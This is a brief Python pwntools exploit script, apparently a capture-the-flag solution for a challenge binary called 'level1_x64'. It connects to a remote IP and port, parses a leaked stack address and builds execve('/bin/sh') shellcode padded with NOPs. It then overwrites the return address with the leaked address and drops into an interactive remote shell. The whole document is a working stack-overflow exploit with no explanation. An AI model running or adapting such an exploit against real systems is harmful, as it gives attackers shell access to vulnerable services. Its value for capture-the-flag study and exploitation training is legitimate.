from pwn import *

#r = process("./level1_x64")
r = remote("106.15.186.69",30012)
shellcode = '''start:jmp xx;yy:pop rdi;mov rax, 0x3b;mov rsi, 0;mov rdx, 0;syscall;xx:call yy;.string \"/bin/sh\";\n'''
#gdb.attach(r)
context.log_level = "DEBUG"
m = r.recv()
n = m[18:26]
e = asm(shellcode,arch="amd64")

payload = e+'\x90'*(0x28-len(e))
add = m[24:26]+m[22:24]+m[20:22]+m[18:20]+m[16:18]+m[14:16]
payload = payload+add.decode('hex')
print payload
r.send(payload)
r.interactive()
